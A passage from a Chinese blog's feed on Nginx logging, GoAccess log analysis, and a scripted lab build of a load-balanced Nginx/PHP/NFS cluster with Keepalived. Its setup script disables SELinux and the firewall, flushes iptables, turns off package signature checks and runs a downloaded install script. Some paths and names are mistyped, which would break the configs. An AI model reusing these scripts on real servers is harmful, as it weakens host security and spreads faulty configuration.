/usr/local/nginx/logs/total 16-rw-r--r--. 1 root   root    0 Jun  3 20:27 202206022028.nginx666.access.log-rw-r--r--. 1 root   root 1540 Jun  3 06:33 access.log-rw-r--r--. 1 nobody root 2741 Jun  3 20:02 error.log-rw-r--r--. 1 nobody root 2246 Jun  3 20:24 host.access.log-rw-r--r--. 1 nobody root    0 Jun  3 20:28 nginx666.access.log-rw-r--r--. 1 root   root    6 Jun  3 20:27 nginx.pid[root@rhel76 ~]&amp;[root@rhel76 ~]&amp; ll /usr/local/nginx/logs/total 24-rw-r--r--. 1 root   root    0 Jun  3 20:27 202206022028.nginx666.access.log-rw-r--r--. 1 nobody root   94 Jun  3 20:28 202206022029.nginx666.access.log-rw-r--r--. 1 root   root 1540 Jun  3 06:33 access.log-rw-r--r--. 1 nobody root 2741 Jun  3 20:02 error.log-rw-r--r--. 1 nobody root 2246 Jun  3 20:24 host.access.log-rw-r--r--. 1 nobody root  188 Jun  3 20:29 nginx666.access.log-rw-r--r--. 1 root   root    6 Jun  3 20:27 nginx.pid[root@rhel76 ~]&amp;</code></pre><h2 id="Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error-log"><a href="#Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error-log" class="headerlink" title="Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error.log"></a>Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error.log</h2><p>&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x8BB0;&#x5F55;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;Nginx&#x51FA;&#x9519;&#x65F6;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x683C;&#x5F0F;&#x4E0D;&#x652F;&#x6301;&#x81EA;&#x5B9A;&#x4E49;&#xFF0C;&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7CFB;&#x7EDF;&#x67D0;&#x4E2A;&#x670D;&#x52A1;&#x6216;server&#x7684;&#x6027;&#x80FD;&#x74F6;&#x9888;&#x7B49;&#x3002;   </p><p><strong>Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x51E0;&#x4E2A;&#x7B49;&#x7EA7;</strong><br>error_ log &#x6307;&#x4EE4;&#x7684;&#x7B2C;1&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B58;&#x653E;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x8DEF;&#x5F84;&#x3002;&#x7B2C;2&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;&#x8BE6;&#x7EC6;&#x7A0B;&#x5EA6;&#x7684;&#x7B49;&#x7EA7;,&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;error<br><code>debug</code>&#x3001;<code>info</code>&#x3001;<code>notice</code>&#x3001;<code>warn</code>&#x3001;<code>error</code>&#x548C;<code>crit</code>, &#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x8BE6;&#x7EC6;&#x7A0B;&#x5EA6;&#x4F9D;&#x6B21;&#x9012;&#x51CF;,debug&#x8BB0;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#x6700;&#x8BE6;&#x7EC6;,crit&#x8BB0;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#x6700;&#x7B80;&#x6D01;&#x3002;  </p><pre><code class="shell">[root@rhel76 ~]&amp; cat /usr/local/nginx/logs/error.log</code></pre><pre><code>2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: still could not bind()2022/06/03 05:54:09 [notice] 13533#0: signal process started2022/06/03 05:54:09 [error] 13533#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: still could not bind()2022/06/03 05:54:37 [notice] 13571#0: signal process started2022/06/03 05:54:37 [error] 13571#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)2022/06/03 05:54:41 [notice] 13575#0: signal process started2022/06/03 05:54:41 [error] 13575#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)2022/06/03 05:55:01 [alert] 13417#0: unlink() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)2022/06/03 06:27:17 [error] 13613#0: *4 open() &quot;/usr/local/nginx/html/favicon.ico&quot; failed (2: No such file or directory), client: 192.168.73.1, server: localhost, request: &quot;GET /favicon.ico HTTP/1.1&quot;, host: &quot;192.168.73.24&quot;, referrer: &quot;http://192.168.73.24/&quot;</code></pre><h2 id="&#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccess"><a href="#&#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccess" class="headerlink" title="&#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccess"></a>&#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccess</h2><p>GoAccess &#x662F;&#x4E00;&#x6B3E;&#x5F00;&#x6E90;&#x7684;&#x4E14;&#x5177;&#x6709;&#x4EA4;&#x4E92;&#x89C6;&#x56FE;&#x754C;&#x9762;&#x7684;&#x5B9E;&#x65F6; Web &#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#xFF0C;&#x901A;&#x8FC7;&#x4F60;&#x7684; Web &#x6D4F;&#x89C8;&#x5668;&#x6216;&#x8005; *nix &#x7CFB;&#x7EDF;&#x4E0B;&#x7684;&#x7EC8;&#x7AEF;&#x7A0B;&#x5E8F;(terminal)&#x5373;&#x53EF;&#x8BBF;&#x95EE;&#x3002;</p><p>&#x80FD;&#x4E3A;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x63D0;&#x4F9B;&#x5FEB;&#x901F;&#x4E14;&#x6709;&#x4EF7;&#x503C;&#x7684; HTTP &#x7EDF;&#x8BA1;&#xFF0C;&#x5E76;&#x4EE5;&#x5728;&#x7EBF;&#x53EF;&#x89C6;&#x5316;&#x670D;&#x52A1;&#x5668;&#x7684;&#x65B9;&#x5F0F;&#x5448;&#x73B0;&#x3002;  </p><p><strong>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;</strong><br>&#x5B98;&#x7F51;&#xFF1A;<a href="https://goaccess.io/" target="_blank" rel="noopener">https://goaccess.io/</a><br>&#x4E2D;&#x6587;&#x7AD9;&#xFF1A;<a href="https://www.goaccess.cc/" target="_blank" rel="noopener">https://www.goaccess.cc/</a><br>&#x6700;&#x65B0;&#x7248;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href="https://goaccess.io/download" target="_blank" rel="noopener">https://goaccess.io/download</a><br>&#x5176;&#x5B83;&#x7248;&#x672C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/allinurl/goaccess/tags" target="_blank" rel="noopener">https://github.com/allinurl/goaccess/tags</a>  </p><pre><code class="shell">[root@rhel76 Packages]&amp; [root@rhel76 Packages]&amp; wget https://github.com/allinurl/goaccess/archive/refs/tags/v1.2.tar.gz[root@rhel76 Packages]&amp; tar -zxvf v1.2.tar.gz[root@rhel76 Packages]&amp; cd goaccess-1.2[root@rhel76 goaccess-1.2]&amp; [root@rhel76 goaccess-1.2]&amp; yum install -y ncurses-devel geoip-devel libmaxminddb-devel openssl-devel[root@rhel76 goaccess-1.2]&amp; ./configure --enable-utf8 --enable-geoip=mmdb[root@rhel76 goaccess-1.2]&amp; make &amp;&amp; make install[root@rhel76 ~]&amp; goaccessGoAccess - 1.2Usage: goaccess [filename] [ options ... ] [-c][-M][-H][-q][-d][...]The following options can also be supplied to the command:Log &amp; Date Format Options  --date-format=&lt;dateformat&gt;      - Specify log date format. e.g., %d/%b/%Y  --log-format=&lt;logformat&gt;        - Specify log format. Inner quotes need to be                                    escaped, or use single quotes.  --time-format=&lt;timeformat&gt;      - Specify log time format. e.g., %H:%M:%SUser Interface Options---------------------------------&#x7701;&#x7565;----------------------------------------------------</code></pre><p><strong>&#x57FA;&#x672C;&#x4F7F;&#x7528;</strong></p><pre><code>[root@rhel76 ~]&amp; goaccess -f /usr/local/nginx/logs/access.log --log-format=&quot;%h %^[%d:%t %^] \&quot;%r\&quot; %s %b \&quot;%R\&quot; \&quot;%u\&quot;&quot; --date-format=&quot;%d/%b/%Y&quot; --time-format=%H:%M:%S</code></pre><p><img src="https://s1.ax1x.com/2022/06/03/XUSh7t.png" alt="XUSh7t.png"></p><p>&#x751F;&#x6210;HTML&#x7EDF;&#x8BA1;&#x8868;  </p><pre><code class="shell">[root@rhel76 nginx]$ goaccess -f /usr/local/nginx/logs/access.log --log-format=&quot;%h %^[%d:%t %^] \&quot;%r\&quot; %s %b \&quot;%R\&quot; \&quot;%u\&quot;&quot; --date-format=&quot;%d/%b/%Y&quot; --time-format=%H:%M:%S --hour-spec=min -o  /usr/local/nginx/html/nginx-log.html[root@rhel76 nginx]$</code></pre><p><img src="https://s1.ax1x.com/2022/06/03/XUG0tP.png" alt="XUG0tP.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Nginx&amp;#x65E5;&amp;#x5FD7;&amp;#x7BA1;&amp;#x7406;&quot;&gt;&lt;a href=&quot;#Nginx&amp;#x65E5;&amp;#x5FD7;&amp;#x7BA1;&amp;#x7406;&quot; class=&quot;headerlink&quot; title=&quot;Nginx&amp;#x65E5;&amp;#x5F
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx平滑升级</title>
    <link href="https://marnm.github.io//posts/1db2b3f1/"/>
    <id>https://marnm.github.io//posts/1db2b3f1/</id>
    <published>2022-06-07T04:47:23.000Z</published>
    <updated>2022-06-07T04:56:53.642Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx高可用架构配置</title>
    <link href="https://marnm.github.io//posts/d2802762/"/>
    <id>https://marnm.github.io//posts/d2802762/</id>
    <published>2022-06-07T04:47:14.000Z</published>
    <updated>2022-06-07T05:10:07.433Z</updated>
    
    <content type="html"><![CDATA[<p><strong>9&#x53F0;&#x673A;&#x5668;IP&#x5730;&#x5740;&#x5206;&#x914D;&#xFF08;&#x9759;&#x6001;&#xFF09;&#xFF1A;</strong>&#xFF1A;<br><code>192.168.110.11</code> &#x2014;-&gt; Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;<br><code>192.168.110.12</code> &#x2014;-&gt; Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;<br><code>192.168.110.13</code> &#x2014;-&gt; Nginx Server<br><code>192.168.110.14</code> &#x2014;-&gt; Nginx Server<br><code>192.168.110.15</code> &#x2014;-&gt; PHP 5.6<br><code>192.168.110.16</code> &#x2014;-&gt; PHP 5.6<br><code>192.168.110.17</code> &#x2014;-&gt; &#x5B58;&#x50A8;&#x670D;&#x52A1;<br><code>192.168.110.18</code> &#x2014;-&gt; MySQL<br><code>192.168.110.19</code> &#x2014;-&gt; NMySQL </p><h2 id="&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;"><a href="#&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;"></a>&#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;</h2><p>&#x5728;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x5B8C;&#x6210;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x548C;&#x4F18;&#x5316;</p><pre><code class="shell">#!/bin/bash# CentOS 7 Local YUM and EPEL Repository# local yum and epel repositoryfunction centos7(){mv -f /etc/yum.repos.d/*.repo /tmp/cat &gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF[local-yum]name=Local Base ISO Repositorybaseurl=http://192.168.110.3/iso/centos7enabled=1gpgcheck=0priority=1EOF# local epelcat &gt; /etc/yum.repos.d/epel-local.repo &lt;&lt; EOF[epel-local]name=Extra Packages for CentOS 7baseurl=http://192.168.110.3/epel/7/x86_64failovermethod=priorityenabled=1gpgcheck=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7EOFyum clean all &amp;&amp; yum makecacheyum install -y vim wget}# Red Hat Enterprise Linux 7 Local YUM and EPEL Repositoryfunction rhel7(){mv -f /etc/yum.repos.d/*.repo /tmpcat &gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF[local-yum]name=Local Base ISO Repositorybaseurl=http://192.168.110.3/iso/rhel7enabled=1gpgcheck=0priority=1EOF# local epelcat &gt; /etc/yum.repos.d/epel-local.repo &lt;&lt; EOF[epel-local]name=Extra Packages for Enterprise Linux 7baseurl=http://192.168.110.3/epel/7Server/x86_64enabled=1gpgcheck=0EOFyum clean all &amp;&amp; yum makecacheyum install -y vim wget}# Optimiz Linuxsed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null# Change IP Address name=`ip a |  grep ens | tr -d : | awk &apos;{print $2}&apos; | head -1`ip=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`cat &gt; /etc/sysconfig/network-scripts/ifcfg-$name &lt;&lt; EOFTYPE=EthernetBOOTPROTO=staticDEFROUTE=yesPEERDNS=yesPEERROUTES=yesIPV4_FAILURE_FATAL=noNAME=$nameDEVICE=$nameONBOOT=yesIPADDR=$ipNETMASK=255.255.255.0GATEWAY=192.168.110.1DNS1=192.168.110.1EOF# Manual replace ip addressread -p &quot;Change New IP Address: &quot; new_ipsed -i &quot;s/$ip/$new_ip/g&quot; /etc/sysconfig/network-scripts/ifcfg-$namesystemctl restart network# Change hostnamehost_bit=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1 | awk &apos; BEGIN{ FS=&quot;.&quot;} { print $4 }&apos;`hostnamectl set-hostname server$host_bit# Configuration Local Repository#OS=`cat /etc/redhat-release  | awk &apos;{ print $1 }&apos;`if [ `cat /etc/redhat-release  | awk &apos;{ print $1 }&apos;` == &quot;CentOS&quot; ]    then centos7else    rhel7fi# shutdowninit 0</code></pre><h2 id="&#x914D;&#x7F6E;Nginx-Server"><a href="#&#x914D;&#x7F6E;Nginx-Server" class="headerlink" title="&#x914D;&#x7F6E;Nginx Server"></a>&#x914D;&#x7F6E;Nginx Server</h2><pre><code class="shell">#!/bin/bash# Install compiler requirment envyum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-libs openssl-devel zlib zlib-devel# source build for Nginx cd /usr/local/src/curl -O --progress http://192.168.110.3/src/nginx-1.12.0.tar.gztar -zxf nginx-1.12.0.tar.gzcd nginx-1.12.0/./configure --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcremakemake installln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginxcd /usr/local/nginx/conf/cp nginx.conf nginx.conf.bak# Change Nginx Configcat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt;EOFuser nobody;worker_processes auto;worker_cpu_affinity 0001;worker_rlimit_nofile 50000;error_log /usr/local/nginx/logs/error.log warn;pid /usr/local/nginx/logs/nginx.pid;events {    worker_connections 50000;    use epoll;    multi_accept on;}http {    include mime.types;    default_type application/octet-stream;    log_format  main  &apos;\$remote_addr - \$remote_user [\$time_local] &quot;\$request&quot; &apos;                      &apos;\$status \$body_bytes_sent &quot;\$http_referer&quot; &apos;                      &apos;&quot;\$http_user_agent&quot; &quot;\$http_x_forwarded_for&quot;&apos;;    access_log /usr/local/nginx/logs/access.log main;    sendfile on;    tcp_nopush on;    keepalive_timeout 65;    gzip on;    gzip_min_length 2K;    gzip_buffers 4 16k;    gzip_comp_level 5;    gzip_types text/plain application/x-javascript text/css application/xml;    include /usr/local/nginx/conf/user/*.conf;}EOFnginxmkdir -p /usr/local/nginx/conf/usercat &gt; /usr/local/nginx/conf/user/uplooking.conf &lt;&lt;EOFserver {    listen 80;    server_name www.uplookinglinux.com;    charset utf-8;    access_log /usr/local/nginx/logs/uplookinglinux.access.log main;    location / {        root /var/www/web;        index index.html index.htm;    }    error_page 500 502 503 504 /50x.html;    location = /50x.thml {        root /usr/local/nginx/html;    }}EOFnginx -s reloadmkdir -p /var/www/webecho &quot;Welcome to Nginx&quot; &gt; /var/www/web/index.htmlchown -Rf nobody:nobody /var/www/webecho -e &quot;* soft nproc 65535\n* hard nproc 65535\n* soft nofile 65535\n* hard nofile 65535&quot; &gt;&gt; /etc/security/limits.conf# &#x6D4B;&#x8BD5;NginxCURL=&apos;/usr/bin/curl&apos;RVMHTTP=&quot;127.0.0.1&quot;CURLARGS=&quot;-s -I&quot;#raw=&quot;$($CURL $CURLARGS $RVMHTTP)&quot;# curl -s -I 127.0.0.1 &gt; /tmp/stat_code$CURL $CURLARGS $RVMHTTP &gt; /tmp/stat_code# &#x83B7;&#x53D6;http&#x72B6;&#x6001;&#x7801;http_code=`/usr/bin/sed -n &apos;1,1p&apos; /tmp/stat_code | /usr/bin/awk &apos;{ print $2 }&apos;`if [[ $http_code -ge 200 &amp;&amp; $http_code -le 299 ]]then    echo -e &quot;\e[1;32mNginx OK\e[0m&quot;else    echo -e &quot;\e[1;31mServer Error !\e[0m&quot;finginx -v# &#x6302;&#x8F7D;NFS&#x76EE;&#x5F55;&#x5230;&#x9759;&#x6001;Nginx Server&#x4E0A;yum install -y nfs-utils &amp;&amp; mount -t nfs 192.168.110.17:/webData /var/www/web/echo -e &quot;192.168.110.17:/webData\t/var/www/web\tnfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstabmount -aecho &quot;&#x8BF7;&#x9000;&#x51FA;&#x5F53;&#x671F;&#x4F1A;&#x8BDD;&#x5E76;&#x91CD;&#x65B0;&#x767B;&#x5F55;&#xFF01;&quot;</code></pre><h2 id="&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;"><a href="#&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;" class="headerlink" title="&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;"></a>&#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</h2><pre><code class="shell">#!/bin/bash# &#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x73AF;&#x5883;yum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-libs openssl-devel zlib zlib-devel# &#x83B7;&#x53D6;Nginxcd /usr/local/src/curl -O --progress http://192.168.110.3/src/nginx-1.12.0.tar.gztar -zxf nginx-1.12.0.tar.gzcd nginx-1.12.0/# &#x7F16;&#x8BD1;Nginx./configure --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcremakemake installln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginxnginxcd /usr/local/nginx/conf/cp nginx.conf nginx.conf.bakmkdir -p /usr/local/nginx/conf/usercat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt; EOFuser nobody;worker_processes auto;worker_cpu_affinity 0001;worker_rlimit_nofile 50000;error_log /usr/local/nginx/logs/error.log warn;pid /usr/local/nginx/logs/nginx.pid;events {    worker_connections 50000;    use epoll;    multi_accept on;}http {    include mime.types;    default_type application/octet-stream;    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;    access_log /usr/local/nginx/logs/access.log main;    sendfile on;    tcp_nopush on;    keepalive_timeout 65;    gzip on;    gzip_min_length 2K;    gzip_buffers 4 16k;    gzip_comp_level 5;    gzip_types text/plain application/x-javascript text/css application/xml;    upstream webServer {        server 192.168.110.13:80 weight=1 max_fails=3 fail_timeout=10s;        server 192.168.110.14:80 weight=1 max_fails=3 fail_timeout=10s;    }    include /user/local/nginx/conf/user/*.conf;}EOFcat &gt; /usr/local/nginx/conf/user/proxy.conf &lt;&lt; EOFserver {    listen 80;    server_name www.uplookinglinux.com;    charset utf-8;    access_log /usr/local/nginx/logs/proxy.access.log main;    location / {        root /var/www/web;        index index.html index.htm;        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;        proxy_pass http://webServer;        #&#x4F20;&#x9012;&#x5BA2;&#x6237;&#x7684;ip&#x4FE1;&#x606F;&#x7ED9;&#x8FD9;&#x53F0;&#x670D;&#x52A1;&#x5668; &#x5728;&#x540E;&#x53F0;&#x670D;&#x52A1;&#x901A;&#x8FC7;&#x53C2;&#x6570;$http_x_real_ip&#x53D6;&#x5F97;&#x8BE5;&#x4F20;&#x9012;&#x7684;IP&#x4FE1;&#x606F;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_redirect off;        proxy_connect_timeout 30;        proxy_send_timeout 15;        proxy_read_timeout 15;    }}EOFnginx -s reload</code></pre><h2 id="&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;"><a href="#&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;" class="headerlink" title="&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;"></a>&#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;</h2><pre><code class="shell"># &#x5B89;&#x88C5;RAID&#x7BA1;&#x7406;&#x5DE5;&#x5177;yum install -y mdadm# &#x521B;&#x5EFA;RAID10mdadm -Cv /dev/md10 -a yes -l 10 -n 4 /dev/sd[b-e]mdadm -Q /dev/md10mdadm -q /dev/md10# &#x5236;&#x4F5C;LVM&#x5206;&#x533A;pvcreate /dev/md10vgcreate webData /dev/md10lvcreate -n lv_web -L 20G webDatamkfs.xfs /dev/webData/lv_web# &#x6302;&#x8F7D;&#x78C1;&#x76D8;mkdir /webDataecho -e &quot;/dev/webData/lv_web\t/webData\t xfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstabmount -a# &#x914D;&#x7F6E;NFS Serveryum install -y rpcbind nfs-utilssystemctl start rpcbind &amp;&gt; /dev/nullsystemctl enable rpcbind &amp;&gt; /dev/nullsystemctl status rpcbindecho -e &quot;/webData *(rw,sync,all_squash,anonuid=99,anongid=99)&quot; &gt; /etc/exportssystemctl start nfssystemctl status nfs</code></pre><h2 id="&#x914D;&#x7F6E;PHP-FastCGI"><a href="#&#x914D;&#x7F6E;PHP-FastCGI" class="headerlink" title="&#x914D;&#x7F6E;PHP FastCGI"></a>&#x914D;&#x7F6E;PHP FastCGI</h2><pre><code class="shell">#!/bin/bash# filename : php-config.sh# &#x914D;&#x7F6E;PHPcd /usr/local/src/curl -O --progress http://192.168.110.3/src/php5.6_auto_install.tar.gztar zxf php5.6_auto_install.tar.gzcd php5.6/chmod a+x install.sh. ./install.sh# &#x521B;&#x5EFA;&#x7AD9;&#x70B9;&#x76EE;&#x5F55;mkdir -p /var/www/webecho -e &quot;&lt;?php\n\tphpinfo();\n?&gt;&quot; &gt; /var/www/web/index.php</code></pre><h3 id="&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI"><a href="#&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI" class="headerlink" title="&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI"></a>&#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI</h3><pre><code class="shell">#!/bin/bash# filename : ngxin-fastcgi.shcat &gt;&gt; /usr/local/nginx/conf/nginx.conf &lt;&lt;EOFupstream phpServer {    # &#x6307;&#x5B9A;&#x8D1F;&#x8F7D;&#x7B97;&#x6CD5;&#xFF1A;&#x7279;&#x5B9A;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7531;&#x56FA;&#x5B9A;&#x7684;&#x670D;&#x52A1;&#x5668;&#x670D;&#x52A1;&#xFF0C;&#x89E3;&#x51B3;session&#x5171;&#x4EAB;&#x95EE;&#x9898;    ip_hash;    server 192.168.110.15:9000 max_fails=3 fail_timeout=10s;    server 192.168.110.16:9000 max_fails=3 fail_timeout=10s;}EOFcat &gt;&gt; /usr/local/nginx/conf/user/proxy.conf &lt;&lt; EOFfastcgi_connect_timeout 30;fastcgi_send_timeout 30;fastcgi_read_timeout 30;fastcgi_buffer_size 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;location ~ \.(php|php5)$ {    root /var/www/web;    #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230;phpServer&#x96C6;&#x7FA4;    fastcgi_pass phpServer;    fastcgi_index index.php;    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;    include fastcgi_params;}EOFnginx -tnginx -s reload</code></pre><h2 id="Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived"><a href="#Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived" class="headerlink" title="Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived"></a>Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived</h2><pre><code class="shell">#!/bin/bashecho -e &quot;192.168.110.11\tserver11\n192.168.110.12\tserver12&quot; &gt;&gt; /etc/hosts# &#x5B89;&#x88C5;Keepalivedyum install -y keepalivedmv -f /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.confbackcat &gt; /etc/keepaliaved/keepalived.conf &lt;&lt; EOF! Configuration File for keepalivedglobal_defs {    notification_email {        fnaichu@qq.com    }    notification_email_from keepalvied@proxy-1    smtp_server 127.0.0.1    smtp_connect_timeout 30    router_id proxy-1    vrrp_mcast_group4 224.4.4.4}vrrp_script chk_proxy {    script &quot;/etc/keepalived/proxy_check.sh&quot;    interval 2    weight -2}vrrp_instance VI_1 {    state BACKUP    nopreempt    virtual_router_id 11    priority 100    